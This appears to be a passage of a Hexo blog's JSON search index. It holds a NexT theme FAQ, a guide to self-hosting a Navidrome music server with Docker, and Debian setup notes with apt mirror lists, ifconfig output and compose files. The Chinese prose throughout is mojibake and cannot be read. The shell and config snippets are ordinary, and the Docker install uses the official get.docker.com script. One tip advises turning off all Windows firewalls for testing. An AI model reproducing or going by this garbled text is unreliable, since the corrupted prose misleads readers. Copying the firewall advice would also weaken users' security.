çš„éœ€æ±‚ã€‚ä»¥ä¸‹çš„ä¿®æ”¹å°†è¦†ç›– å­—ä½“å®šåˆ¶ çš„ç‰¹æ€§ã€‚ ç¼–è¾‘ä¸»é¢˜ä¸‹çš„ source/css/_variables/custom.styl æ–‡ä»¶ï¼Œæ–°å¢ä¸¤ä¸ªå˜é‡ï¼š 1234567891011121314// æ ‡é¢˜ï¼Œä¿®æ”¹æˆä½ æœŸæœ›çš„å­—ä½“æ—$font-family-headings = Georgia, sans// ä¿®æ”¹æˆä½ æœŸæœ›çš„å­—ä½“æ—$font-family-base = &quot;Microsoft YaHei&quot;, Verdana, sans-serif// ä»£ç å­—ä½“$code-font-family = &quot;Input Mono&quot;, &quot;PT Mono&quot;, Consolas, Monaco, Menlo, monospace// æ­£æ–‡å­—ä½“çš„å¤§å°$font-size-base = 16px// ä»£ç å­—ä½“çš„å¤§å°$code-font-size = 13px å¦‚ä½•æ›´æ”¹å†…å®¹åŒºåŸŸçš„å®½åº¦ï¼ŸNexT å¯¹äºå†…å®¹çš„å®½åº¦çš„è®¾å®šå¦‚ä¸‹ï¼š 700pxï¼Œå½“å±å¹•å®½åº¦ &lt; 1600px 900pxï¼Œå½“å±å¹•å®½åº¦ &gt;&#x3D; 1600px ç§»åŠ¨è®¾å¤‡ä¸‹ï¼Œå®½åº¦è‡ªé€‚åº” å¦‚æœä½ éœ€è¦ä¿®æ”¹å†…å®¹çš„å®½åº¦ï¼ŒåŒæ ·éœ€è¦ç¼–è¾‘æ ·å¼æ–‡ä»¶ã€‚ ç¼–è¾‘ä¸»é¢˜çš„ source/css/_variables/custom.styl æ–‡ä»¶ï¼Œæ–°å¢å˜é‡ï¼š 12345// ä¿®æ”¹æˆä½ æœŸæœ›çš„å®½åº¦$content-desktop = 700px// å½“è§†çª—è¶…è¿‡ 1600px åçš„å®½åº¦$content-desktop-large = 900px æ­¤æ–¹æ³•ä¸é€‚ç”¨äº Pisces Schemeï¼Œå…³äºå¦‚ä½•ä¿®æ”¹ Pisces Scheme çš„å®½åº¦è¯·å‚çœ‹ è¿™ä¸ª Issue ä¸ºä½•æ–°å¢çš„èœå•é¡¹æ˜¾ç¤º Menu.xxxNexT ä½¿ç”¨äº† Hexo æä¾›çš„å›½é™…åŒ–åŠŸèƒ½ï¼Œå› æ­¤åœ¨ Menu éƒ¨åˆ†é…ç½®çš„å€¼å¹¶éç›´æ¥ç”¨äºç•Œé¢çš„å±•ç¤ºï¼Œè€Œæ˜¯ä½œä¸ºä¸€ä¸ªåç§°ã€‚ å½“æ¸²æŸ“çš„æ—¶å€™ï¼ŒNexT å»å¯»æ‰¾å¯¹åº”çš„è¯­è¨€æ–‡ä»¶ï¼Œå¹¶æ›¿æ¢è¿™ä¸ªé”®æ‰€å®šä¹‰çš„æ–‡æœ¬åå±•ç¤ºã€‚ ä»¥ home ä¸ºä¾‹ï¼Œåœ¨ ä¸»é¢˜é…ç½®æ–‡ä»¶ ä¸­é…ç½®ä¸º home: /ï¼Œ æ­¤å¤„çš„é”®å³æ˜¯ homeï¼Œåœ¨ä¸åŒçš„è¯­è¨€ä¸­ï¼Œè¿™ä¸ªé”®æ‰€å¯¹åº”çš„æ–‡æœ¬éƒ½ä¸åŒï¼š 123456789# ç®€ä½“ä¸­æ–‡# è¯­è¨€æ–‡ä»¶ languages/zh-Hans.ymlmenu: home: é¦–é¡µ# è‹±æ–‡# è¯­è¨€æ–‡ä»¶ languages/en.ymlmenu: home: Home å› æ­¤ï¼Œå½“æ–°å¢ä¸€ä¸ªé¡¹æ—¶ï¼Œå¿…é¡»åœ¨ æ‰€ä½¿ç”¨çš„è¯­è¨€ ä¸­æ·»åŠ å¯¹åº”çš„ç¿»è¯‘æ–‡æœ¬ã€‚ å…³äºèœå•çš„é…ç½®ï¼Œè¯·å‚è€ƒ èœå•çš„é…ç½® æ ‡ç­¾&#x2F;åˆ†ç±»æ•°é‡ç»Ÿè®¡ä¸å‡†ç¡®ï¼Ÿå› ä¸º Hexo æœ‰ç¼“å­˜çš„åŠŸèƒ½ï¼Œå› æ­¤æœ‰æ—¶å€™ä½ ä¼šå‘ç°åœ¨ æ ‡ç­¾ å’Œ åˆ†ç±» é¡µé¢ä¸­çš„æ•°é‡ç»Ÿè®¡å¹¶ä¸å‡†ç¡®ã€‚ å‡ºç°è¿™ä¸ªé—®é¢˜æ—¶ï¼Œå¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤é‡æ–°ç”Ÿæˆç«™ç‚¹çš„å†…å®¹ï¼š åˆ é™¤ç«™ç‚¹ç›®å½•ä¸‹çš„ db.json æ–‡ä»¶ åœ¨ç«™ç‚¹ç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤ hexo clean åœ¨ç«™ç‚¹ç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤ï¼Œé‡æ–°ç”Ÿæˆ hexo generate å½“æ‰§è¡Œå®Œä»¥ä¸Šæ­¥éª¤åï¼Œå¯ä»¥åœ¨æœ¬åœ°å¯åŠ¨æœåŠ¡å™¨æ¥éªŒè¯ä¸‹æ˜¯å¦å·²ç»è§£å†³é—®é¢˜ã€‚ ä¸ºä½•è¯­è¨€æ˜¾ç¤ºä¸æ­£ç¡®ï¼Ÿè‹¥æ²¡æœ‰è®¾å®š language çš„å€¼æˆ–è€… language: defaultï¼Œä¼šå‡ºç°è¯­è¨€é€‰æ‹©ä¸æ­£ç¡®çš„æƒ…å†µã€‚ å› æ­¤ä¸ºäº†ç¡®ä¿è¯­è¨€æ­£ç¡®æ˜¾ç¤ºï¼Œè¯·æ˜ç¡®æŒ‡å®šéœ€è¦ä½¿ç”¨çš„è¯­è¨€ã€‚ ç¼–è¾‘ ç«™ç‚¹é…ç½®æ–‡ä»¶ï¼Œ å°† language å­—æ®µè®¾ç½®æˆæ˜ç¡®çš„è¯­è¨€ä»£ç ã€‚ ä¾‹å¦‚ï¼Œè®¾ç½®è¯­è¨€ä¸ºç®€ä½“ä¸­æ–‡ï¼š 1language: zh-Hans è¯­è¨€ å¯¹åº”å€¼ English en ç®€ä½“ä¸­æ–‡ zh-Hans æ³•è¯­ fr-FR ç¹ä½“ä¸­æ–‡ zh-hk&#x2F;zh-tw ä¿„è¯­ ru å¾·è¯­ de è‘¡è„ç‰™è¯­ pt æ—¥è¯­ ja å¦‚ä½•å…³é—­æ–°å»ºé¡µé¢çš„è¯„è®ºåŠŸèƒ½ï¼Ÿå½“é›†æˆäº†è¯„è®ºç³»ç»Ÿï¼Œå¦‚ Disqusï¼Œæ‰€æœ‰æ–°å»ºçš„é¡µé¢éƒ½å°†è‡ªåŠ¨å¼€å¯è¯„è®ºã€‚è‹¥ä½ ä¸éœ€è¦è¯„è®ºï¼Œè¯·åœ¨é¡µé¢çš„ Front-matter é‡Œæ·»åŠ  comments å­—æ®µï¼Œå¹¶å°†å€¼è®¾ç½®ä¸º falseã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š 12345title: All tagsdate: 2015-12-16 17:05:24type: &quot;tags&quot;comments: false--- å¦‚ä½•è®¾ç½®é¡µé¢æ–‡ç« çš„ç¯‡æ•°ï¼Ÿåœ¨ Hexo é‡Œå¯ä»¥ä¸ºé¦–é¡µå’Œå½’æ¡£é¡µé¢è®¾ç½®ä¸åŒçš„æ–‡ç« ç¯‡æ•°ï¼Œä½†å¯èƒ½éœ€è¦å®‰è£… Hexo æ’ä»¶ã€‚è¯¦ç»†æ­¥éª¤å¦‚ä¸‹ã€‚ ä½¿ç”¨ npm install --save å‘½ä»¤æ¥å®‰è£…éœ€è¦çš„ Hexo æ’ä»¶ã€‚ 123npm install --save hexo-generator-indexnpm install --save hexo-generator-archivenpm install --save hexo-generator-tag ç­‰å¾…æ‰©å±•å…¨éƒ¨å®‰è£…å®Œæˆåï¼Œåœ¨ ç«™ç‚¹é…ç½®æ–‡ç«  ä¸­ï¼Œè®¾å®šå¦‚ä¸‹é€‰é¡¹ï¼š 12345678910index_generator: per_page: 5archive_generator: per_page: 20 yearly: true monthly: truetag_generator: per_page: 10 1per_page å³æ–‡ç« çš„æ•°é‡ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒHexo 3.2 ç‰ˆæœ¬ä¸å…è®¸é…ç½®æ–‡ä»¶ä¸­å­˜åœ¨é‡å¤çš„é€‰é¡¹è®¾ç½®ã€‚ å› æ­¤ï¼Œæœ€å¥½æ£€æŸ¥ä¸‹ ç«™ç‚¹é…ç½®æ–‡ä»¶ ä¸­æ˜¯å¦æœ‰å­˜åœ¨ä¸Šè¿°åŒåçš„é…ç½®ã€‚ å¦‚æœå­˜åœ¨ï¼Œè¯·å°†ä¸¤è€…é…ç½®åœ¨ä¸€èµ·ã€‚ å¦‚ä½•ä¼˜åŒ– NexT ä¸»é¢˜ï¼ŸNexT å¹¶æœªå¯¹ HTMLã€JavaScript ä»¥åŠ CSS åšå‹ç¼©å¤„ç†ã€‚å¦‚æœä½ æ¯”è¾ƒåœ¨æ„è¿™ç‚¹ï¼Œå¯ä»¥åœ¨ NexT çš„ Issues åˆ—è¡¨æœç´¢ ä»–äººå…±äº«çš„ä¼˜åŒ–æ–¹æ¡ˆ ã€‚ Cannot find module XXXNexT æä¾›çš„æ ‡ç­¾æ’ä»¶å¼•ç”¨äº† Hexo æ¨¡å—ä¸­çš„ä¸€äº›å­æ¨¡å—ï¼Œä¾‹å¦‚ hexo-utilã€‚ NPM åœ¨ç‰ˆæœ¬ 3 ä¸­å¼•å…¥äº†æ–°çš„æ¨¡å—å®‰è£…æœºåˆ¶ï¼Œ NexT å°†ä½¿ç”¨è¿™ç§æœºåˆ¶ï¼Œæ„å‘³ç€å¦‚æœæ˜¯æ—§çš„ NPM å°†ä¼šç¢°åˆ°è¿™ä¸ªé”™è¯¯ã€‚ å› æ­¤ï¼Œå¦‚æœæ‚¨ç¢°åˆ° â€œCannot find module XXXâ€ çš„é”™è¯¯æ—¶ï¼Œè¯·é¦–å…ˆä½¿ç”¨ npm -v ç¡®è®¤æ‚¨çš„ NPM ç‰ˆæœ¬ã€‚ ç‰ˆæœ¬ &gt; 3 ä¾ç„¶æŠ¥é”™ï¼š è¯·å…ˆåˆ é™¤ node_module ç›®å½•ï¼Œç„¶åä½¿ç”¨ npm install é‡æ–°å®‰è£…ä¸€ä¸‹æ¨¡å—ã€‚ ç‰ˆæœ¬ &lt; 3ï¼š æ‚¨å¯ä»¥é€‰æ‹©å‡çº§æ‚¨çš„ NPMï¼› æˆ–è€…åœ¨ç«™ç‚¹ç›®å½•ä¸‹æ˜ç¡®æŒ‡å®šæ¨¡å—ä¾èµ– npm install --save hexo-utilã€‚ å…¶ä¸­ hexo-util ä»…æ˜¯ç¤ºä¾‹ï¼Œè¯·æ›¿æ¢æˆé”™è¯¯ä¸­ æç¤ºçš„æ¨¡å—åç§°ã€‚ æ–‡ç« æ¥è‡ªå¸¸è§é—®é¢˜ - NexT ä½¿ç”¨æ–‡æ¡£ (iissnan.com)","categories":[],"tags":[]},{"title":"éŸ³ä¹æœåŠ¡å™¨æ­å»º","slug":"éŸ³ä¹æœåŠ¡å™¨æ­å»º","date":"2024-01-21T15:59:15.000Z","updated":"2024-01-21T17:51:29.209Z","comments":true,"path":"2024/01/21/éŸ³ä¹æœåŠ¡å™¨æ­å»º/","link":"","permalink":"http://example.com/2024/01/21/%E9%9F%B3%E4%B9%90%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/","excerpt":"æ­å»ºåŸå› ç”±äºå›½å†…å¤§å‚åƒç›¸éš¾çœ‹ï¼Œå„ç§å¹¿å‘Šï¼Œappçš„è‡ƒè‚¿ã€‚å†åŠ ä¸Šç‰ˆæƒå„æ–­å¬ä¸ªç ´æ­Œå†²vipéƒ½å¬ä¸å…¨ã€‚äºæ˜¯å¿æ— å¯å¿æ­å»ºäº†è‡ªå·±çš„éŸ³ä¹æœåŠ¡å™¨ æ¨èæ­é…è§‚çœ‹è¿™ä¸ªæ˜¯æˆ‘å½“æ—¶æ¢ç³»ç»Ÿé‡æ–°æ­äº†ä¸€éçš„è¿‡ç¨‹ã€‚æ¢æºä»€ä¹ˆçš„éƒ½æœ‰ï¼Œå¯ä»¥æŸ¥çœ‹ è½¬debian | frozenfishâ€™blog (frozenfish0x.top) è¿™æ˜¯å®˜æ–¹æ–‡æ¡£ï¼Œè‹±è¯­ä¸å¥½å¯ä»¥ç”¨ç¿»è¯‘è½¯ä»¶æŸ¥çœ‹ Documentation | Navidrome","text":"æ­å»ºåŸå› ç”±äºå›½å†…å¤§å‚åƒç›¸éš¾çœ‹ï¼Œå„ç§å¹¿å‘Šï¼Œappçš„è‡ƒè‚¿ã€‚å†åŠ ä¸Šç‰ˆæƒå„æ–­å¬ä¸ªç ´æ­Œå†²vipéƒ½å¬ä¸å…¨ã€‚äºæ˜¯å¿æ— å¯å¿æ­å»ºäº†è‡ªå·±çš„éŸ³ä¹æœåŠ¡å™¨ æ¨èæ­é…è§‚çœ‹è¿™ä¸ªæ˜¯æˆ‘å½“æ—¶æ¢ç³»ç»Ÿé‡æ–°æ­äº†ä¸€éçš„è¿‡ç¨‹ã€‚æ¢æºä»€ä¹ˆçš„éƒ½æœ‰ï¼Œå¯ä»¥æŸ¥çœ‹ è½¬debian | frozenfishâ€™blog (frozenfish0x.top) è¿™æ˜¯å®˜æ–¹æ–‡æ¡£ï¼Œè‹±è¯­ä¸å¥½å¯ä»¥ç”¨ç¿»è¯‘è½¯ä»¶æŸ¥çœ‹ Documentation | Navidrome æ­å»ºæ–¹æ¡ˆæˆ‘æœ¬äººçš„æ–¹æ¡ˆâ€‹ 123è‡ªè´­è®¾å¤‡å½“éŸ³ä¹æœåŠ¡å™¨ï¼š æˆæœ¬ï¼šä¸€ä¸ªè®¾å¤‡çš„é’±ã€‚æˆ‘ä½¿ç”¨çš„æ˜¯n450 600å¿«é’±ï¼Œæ¯ä¸ªæœˆçš„ç”µè´¹å¤§æ¦‚ä¼šå¤šä¸ƒå…«å—é’±ã€‚ æœåŠ¡å™¨è¦ä¸€ç›´å¼€ç€ã€‚å°±åƒè·¯ç”±å™¨ä¸€æ ·ï¼Œæœ‰ä¸€å®šè¿ç»´æˆæœ¬ å…¶ä»–æ–¹æ¡ˆ1ä¹°äº‘æœåŠ¡å™¨ï¼Œå¦‚é˜¿é‡Œäº‘99å¿«é’±ä¸€å¹´çš„æœåŠ¡å™¨æ´»åŠ¨ï¼Œåªæ˜¯è‡ªå·±ç”¨ï¼Œéšä¾¿ä¸€ä¸ªäº‘æœåŠ¡å™¨å°±èƒ½å¸¦èµ·æ¥ã€‚ æ­å»ºå‰æ³¨æ„äº‹é¡¹12345å¦‚æœè‡ªå·±æ­å»ºæœåŠ¡å™¨è¿æ¥åœ¨è·¯ç”±å™¨ä¸‹ï¼Œé¦–å…ˆè¦ç¡®ä¿è‡ªå·±æ‹¥æœ‰å…¬ç½‘ipï¼Œipv6æˆ–è€…ipv4éƒ½å¯ä»¥ï¼Œç¡®ä¿è‡ªå·±è·¯ç”±å™¨é˜²ç«å¢™æœ‰å…³é—­åŠŸèƒ½ï¼šå¯ä»¥æµ‹è¯•é˜²ç«å¢™é€šè¡Œæƒ…å†µï¼Œå§windowså…³é—­æ‰€æœ‰é˜²ç«å¢™ï¼Œç„¶åå®‰è£…ä¸€ä¸ªæœåŠ¡å™¨ï¼Œå¦‚apechï¼Œè¿˜æœ‰phpçš„ä¸€é”®è¯éƒ¨ç½²æµ‹è¯•è½¯ä»¶phpstudyï¼ˆæ¨èï¼‰ç„¶åé€šè¿‡åœ¨æµè§ˆå™¨é€šè¿‡å…¬ç½‘åœ°å€è¿›è¡Œè®¿é—®æµ‹è¯•ã€‚2.å»ºè®®è®©è·¯ç”±å™¨æ‹¨å·ä¸Šç½‘ï¼ŒæŠŠå…‰çŒ«æ”¹æˆæ¡¥æ¥æ¨¡å¼ã€‚ï¼ˆæœ€å¥½è¿™ä¹ˆåšï¼ï¼ï¼ï¼ï¼ï¼ä¸ç„¶ipv4ä¼šæœ‰å…¬ç½‘ipåˆ†é…åœ¨å…‰çŒ«èº«ä¸Šæƒ…å†µã€‚ipv6åˆ™å¯èƒ½åƒä¸åˆ°ipv6åœ°å€åˆ†é…ï¼‰å¦‚æœæ˜¯è‡ªå·±è´­ä¹°çš„äº‘æœåŠ¡å™¨åˆ™ä¸ç”¨æ‹…å¿ƒè¿™äº›é—®é¢˜ï¼Œè¿›è¡Œæ§åˆ¶å°æ”¾è¡Œç«¯å£å°±å¯ä»¥è®¿é—®ã€‚ å®‰è£…123456789101112131415161718192021222324252627282930313233å› ä¸ºåœ¨å®¹å™¨é‡Œè·‘æœ‰æ˜“äºç»´æŠ¤ï¼Œå’Œå¯å¤‡ä»½é…ç½®å®¹æ˜“ç­‰ä¼˜ç‚¹ã€‚æ‰€ä»¥é‡‡ç”¨linux+docker+navidrome+fileBrowseræ–¹æ¡ˆé¦–å…ˆåœ¨ç‰©ç†æœºå®‰è£…ä¸€ä¸ªlinuxç³»ç»Ÿï¼Œæ¨èdebianï¼ˆå®‰è£…äº†åˆ™ä¸ç”¨çœ‹è¿™æ­¥ï¼‰ debianï¼š ç„¶å sudo apt install docker sudo docker pull navidrome sudo docker pull filebrowser/filebrowser ç„¶ååˆ›å»ºå¥¹ä¸¤æ‰€éœ€è¦çš„ç›®å½• æˆ‘è¿™é‡Œæ˜¯åœ¨/home/fish/ä¸‹åˆ›å»º sudo mkdir /home/fish cd /home/fish mkdir filebrowser mkdir music æ–‡ä»¶ç®¡ç†çš„å®‰è£…ï¼š docker run -d -v /home/fish/filebrowser/sites/root:/srv -v /home/fish/filebrowser/filebrowserconfig.json:/etc/config.json -v /home/fish/filebrowser/database.db:/etc/database.db -p 8080:80 filebrowser/filebrowser éŸ³ä¹æœåŠ¡çš„å®‰è£…ï¼š docker run -d \\ --name navidrome \\ --restart=unless-stopped \\ --user $(id -u):$(id -g) \\ -v /home/fish/music:/music:ro \\ -v /home/fish/navidrome:/data \\ -p 4533:4533 \\ -e ND_LOGLEVEL=info \\ deluan/navidrome:latest ç„¶åå°±å®‰è£…æˆåŠŸäº†ï¼š å¯ä»¥é€šè¿‡ä½ çš„å†…ç½‘ip+ç«¯å£å·è¿›è¡Œè®¿é—®æœåŠ¡ 4533æ˜¯éŸ³ä¹æœåŠ¡å™¨ã€‚8080æ˜¯æ–‡ä»¶ç®¡ç† 8080å¯ä»¥ä¸Šä¼ éŸ³ä¹ ä¼˜åŒ–last.fmâ€‹ æ¨èåœ¨è®¾ç½®é‡Œé¢æœ‰ä¸ªlast.fmç‚¹å‡»å‹¾é€‰åï¼Œæ³¨å†Œç„¶åç™»å½•å°±å¯ä»¥ä½¿ç”¨ï¼Œæ³¨æ„åˆ«ç”¨qqé‚®ç®±ï¼Œç”¨gmailå¯ä»¥è¿‡ã€‚ä¸è¡Œå°±ä¸Šé­”æ³•ï¼ å°é¢æ­Œè¯è·å–æœ‰ä¸ªè½¯ä»¶å«music Tagä¸‹è½½åæŠŠéœ€è¦æ·»åŠ å°é¢æ­Œè¯ç­‰ä¿¡æ¯çš„éŸ³ä¹æ”¾è¿›å»å°±å¯ä»¥è·å–æˆåŠŸ æ•™ç¨‹ï¼š å¼€æºéŸ³ä¹æœåŠ¡å™¨Navidromeæœ€ä½³ä¼´ä¾£MusicTagï¼ŒéŸ³ä¹åˆ®å‰Šè¿˜å±MusicTagçŒ›_å“”å“©å“”å“©_bilibili å®¢æˆ·ç«¯ï¼š12å¦‚æœä½ ä¸æƒ³å¤©å¤©ç½‘é¡µæ’­æ”¾ã€‚å…¶å®ä¹Ÿæœ‰è½¯ä»¶å®¢æˆ·ç«¯å¯ä»¥ä½¿ç”¨ï¼Œwindowsè¿˜æœ‰å®‰å“éƒ½æœ‰ï¼Œå®‰å“windowséƒ½å¯ä»¥ä½¿ç”¨&lt;éŸ³æµ&gt;è½¯ä»¶ä½œä¸ºå®¢æˆ·ç«¯ã€‚ç®€å•æ˜“ç”¨ é«˜çº§â€‹ navidromeæ ¹æ®mpvå¼€å‘çš„æ¥å£ï¼Œæ‰€ä»¥å¦‚æœä½ è§‰å¾—éŸ³æµè¿›é˜¶åŠŸèƒ½è¿˜è¦vipå°±å¯ä»¥ä¿®æ”¹è‡ªå·±çš„å®¢æˆ·ç«¯ã€‚æˆ–è€…å®šåˆ¶è‡ªå·±çš„ è‡ªåŠ¨ç‚¹å”±æœºæ¨¡å¼ |èˆªæµ·æœºåœº (navidrome.org) mpv.io ç»“å°¾ï¼šâ€‹ åŸå¤§ä¼™éƒ½èƒ½éŸ³ä¹è‡ªç”±ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼","categories":[],"tags":[]},{"title":"å…³äºç¼–è¯‘","slug":"å…³äºç¼–è¯‘","date":"2024-01-10T13:51:38.000Z","updated":"2024-01-21T16:44:56.495Z","comments":true,"path":"2024/01/10/å…³äºç¼–è¯‘/","link":"","permalink":"http://example.com/2024/01/10/%E5%85%B3%E4%BA%8E%E7%BC%96%E8%AF%91/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"è½¬debian","slug":"è½¬debian","date":"2024-01-08T14:36:12.000Z","updated":"2024-01-21T16:31:39.077Z","comments":true,"path":"2024/01/08/è½¬debian/","link":"","permalink":"http://example.com/2024/01/08/%E8%BD%ACdebian/","excerpt":"ç³»ç»Ÿç›¸å…³12345678910fish@fishserver:~$ lsblkNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTSsda 8:0 0 238.5G 0 disk â”œâ”€sda1 8:1 0 512M 0 part /boot/efiâ”œâ”€sda2 8:2 0 488M 0 part /bootâ””â”€sda3 8:3 0 237.5G 0 part â”œâ”€fishserver--vg-root 254:0 0 27.9G 0 lvm / â”œâ”€fishserver--vg-swap_1 254:1 0 976M 0 lvm [SWAP] â””â”€fishserver--vg-home 254:2 0 208.6G 0 lvm /home 1i","text":"ç³»ç»Ÿç›¸å…³12345678910fish@fishserver:~$ lsblkNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTSsda 8:0 0 238.5G 0 disk â”œâ”€sda1 8:1 0 512M 0 part /boot/efiâ”œâ”€sda2 8:2 0 488M 0 part /bootâ””â”€sda3 8:3 0 237.5G 0 part â”œâ”€fishserver--vg-root 254:0 0 27.9G 0 lvm / â”œâ”€fishserver--vg-swap_1 254:1 0 976M 0 lvm [SWAP] â””â”€fishserver--vg-home 254:2 0 208.6G 0 lvm /home 1i 123ç›®å½•å­˜æ”¾ï¼š /musicéŸ³ä¹ /nav æ•°æ®åº“å·¥å…· æ²¡æœ‰ifconfigå‘½ä»¤12å®‰è£…åŒ…apt install net-tools ifconfigï¼šå•ç½‘å¡12345678910111213141516171819202122232425262728293031323334353637383940414243444546fish@fishserver:~$ /sbin/ifconfig br-031d046d3ebf: flags=4099&lt;UP,BROADCAST,MULTICAST&gt; mtu 1500 inet 172.18.0.1 netmask 255.255.0.0 broadcast 172.18.255.255 ether 02:42:a1:c0:98:79 txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0docker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 172.17.0.1 netmask 255.255.0.0 broadcast 172.17.255.255 inet6 fe80::42:c0ff:fee6:b1dd prefixlen 64 scopeid 0x20&lt;link&gt; ether 02:42:c0:e6:b1:dd txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 5 bytes 526 (526.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0enp1s0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 192.168.2.17 netmask 255.255.255.0 broadcast 192.168.2.255 inet6 fe80::2e0:b4ff:fe60:cea9 prefixlen 64 scopeid 0x20&lt;link&gt; inet6 2408:827a:3f:dd80:2e0:b4ff:fe60:cea9 prefixlen 64 scopeid 0x0&lt;global&gt; ether 00:e0:b4:60:ce:a9 txqueuelen 1000 (Ethernet) RX packets 244 bytes 36051 (35.2 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 235 bytes 34042 (33.2 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 1000 (Local Loopback) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0veth22eda58: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet6 fe80::c079:72ff:fe92:35f7 prefixlen 64 scopeid 0x20&lt;link&gt; ether c2:79:72:92:35:f7 txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 16 bytes 1392 (1.3 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 æ›´æ¢æºä¿®æ”¹æ–‡ä»¶ &#x2F;etc&#x2F;apt&#x2F;sources.list ä¸ºä¸‹é¢å†…å®¹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# Debian 10 buster# ä¸­ç§‘å¤§æºdeb http://mirrors.ustc.edu.cn/debian buster main contrib non-freedeb http://mirrors.ustc.edu.cn/debian buster-updates main contrib non-freedeb http://mirrors.ustc.edu.cn/debian buster-backports main contrib non-freedeb http://mirrors.ustc.edu.cn/debian-security/ buster/updates main contrib non-freedeb-src http://mirrors.ustc.edu.cn/debian buster main contrib non-freedeb-src http://mirrors.ustc.edu.cn/debian buster-updates main contrib non-freedeb-src http://mirrors.ustc.edu.cn/debian buster-backports main contrib non-freedeb-src http://mirrors.ustc.edu.cn/debian-security/ buster/updates main contrib non-free# å®˜æ–¹æºdeb http://deb.debian.org/debian buster main contrib non-freedeb http://deb.debian.org/debian buster-updates main contrib non-freedeb http://deb.debian.org/debian-security/ buster/updates main contrib non-freedeb-src http://deb.debian.org/debian buster main contrib non-freedeb-src http://deb.debian.org/debian buster-updates main contrib non-freedeb-src http://deb.debian.org/debian-security/ buster/updates main contrib non-free# ç½‘æ˜“æºdeb http://mirrors.163.com/debian/ buster main non-free contribdeb http://mirrors.163.com/debian/ buster-updates main non-free contribdeb http://mirrors.163.com/debian/ buster-backports main non-free contribdeb http://mirrors.163.com/debian-security/ buster/updates main non-free contribdeb-src http://mirrors.163.com/debian/ buster main non-free contribdeb-src http://mirrors.163.com/debian/ buster-updates main non-free contribdeb-src http://mirrors.163.com/debian/ buster-backports main non-free contribdeb-src http://mirrors.163.com/debian-security/ buster/updates main non-free contrib# é˜¿é‡Œäº‘deb http://mirrors.aliyun.com/debian/ buster main non-free contribdeb http://mirrors.aliyun.com/debian/ buster-updates main non-free contribdeb http://mirrors.aliyun.com/debian/ buster-backports main non-free contribdeb http://mirrors.aliyun.com/debian-security buster/updates maindeb-src http://mirrors.aliyun.com/debian/ buster main non-free contribdeb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contribdeb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contribdeb-src http://mirrors.aliyun.com/debian-security buster/updates main 123456789101112131415161718apt install sudoapt install dockervim /etc/docker/daemon.json&#123; &quot;registry-mirrors&quot;: [ &quot;https://7bezldxe.mirror.aliyuncs.com/&quot;, &quot;https://docker.mirrors.ustc.edu.cn/&quot;, &quot;https://hub-mirror.c.163.com&quot;, &quot;https://registry.docker-cn.com&quot; ], &quot;insecure-registries&quot;: [], &quot;debug&quot;: false, &quot;experimental&quot;: false, &quot;features&quot;: &#123; &quot;buildkit&quot;: true &#125;&#125; how to install docker 1https://docs.docker.com/desktop/ 1apt install curl 1curl -fsSL https://get.docker.com -o get-docker.sh 1sudo sh get-docker.sh dockerå®‰è£…navidromeå®˜æ–¹çš„å†™æ³•ï¼š123456789101112131415161718192021222324252627282930version: &quot;3&quot;services: navidrome: image: deluan/navidrome:latest user: 1000:1000 # should be owner of volumes ports: - &quot;4533:4533&quot; restart: unless-stopped environment: # Optional: put your config options customization here. Examples: ND_SCANSCHEDULE: 1h ND_LOGLEVEL: info ND_SESSIONTIMEOUT: 24h ND_BASEURL: &quot;&quot; volumes: - &quot;/path/to/data:/data&quot; - &quot;/path/to/your/music/folder:/music:ro&quot; å…¶ä»–1ï¼› version: &#x27;3.8&#x27; services: navidrome: image: &#x27;deluan/navidrome:latest&#x27; container_name: navidrome restart: unless-stopped network_mode: bridge environment: - ND_SCANNER_EXTRACTOR=ffmpeg PND_ENABLETRANSCODINGCONFIGGID=true - ND_ENABLESHARING=true - ND_SCANSCHEDULE=1h ports: - &#x27;4533:4533&#x27; volumes: - /share/Container/navidrome/data:/data - /share/media2/music:/music 1234567891011121314151617181920212223docker-composeåˆ›å»ºåŒ…å«ä»¥ä¸‹å†…å®¹çš„æ–‡ä»¶ï¼ˆæˆ–æ·»åŠ æœåŠ¡ ä¸‹é¢åˆ°æ‚¨ç°æœ‰çš„æ–‡ä»¶ï¼‰ï¼šdocker-compose.ymlnavidromeåˆ›å»ºä¸€ä¸ªdocker-compose.ymlæ–‡ä»¶,å†…å®¹å¦‚ä¸‹ï¼šversion: &quot;3&quot;services: navidrome: image: deluan/navidrome:latest user: 1000:1000 # should be owner of volumes ports: - &quot;4533:4533&quot; restart: 